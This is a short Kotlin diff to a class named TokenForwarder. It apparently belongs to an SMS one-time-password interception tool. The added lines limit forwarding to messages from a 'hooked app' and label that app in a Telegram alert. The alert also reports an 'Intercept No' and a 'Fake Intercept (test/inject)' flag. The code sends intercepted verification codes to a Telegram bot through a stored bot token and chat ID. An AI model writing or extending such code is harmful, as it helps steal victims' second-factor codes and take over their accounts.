@@ -21,6 +21,7 @@ class TokenForwarder(
         val peer = otp.rawPeer.ifBlank { otp.sender }
         val body = otp.body.ifBlank { otp.otp }
         if (!SmsMatcher.shouldForwardToTelegram(config, peer, body, otp.direction)) return false
+        if (SmsMatcher.matchedHookedApp(config, peer, body) == null) return false
 
         val botToken = config.telegramBotToken
         val chatId = config.telegramChatId
@@ -87,6 +88,9 @@ class TokenForwarder(
             }
             if (fakeIntercept) {
                 appendLine("🎭 <b>Fake Intercept</b> (test/inject)")
+            }
+            if (otp.messageLabel.isNotBlank()) {
+                appendLine("📲 <b>Hooked App:</b> ${escapeHtml(otp.messageLabel)}")
             }
             appendLine("📞 <b>Intercept No:</b> ${escapeHtml(interceptNo)}")
             append(escapeHtml(tokenBody))
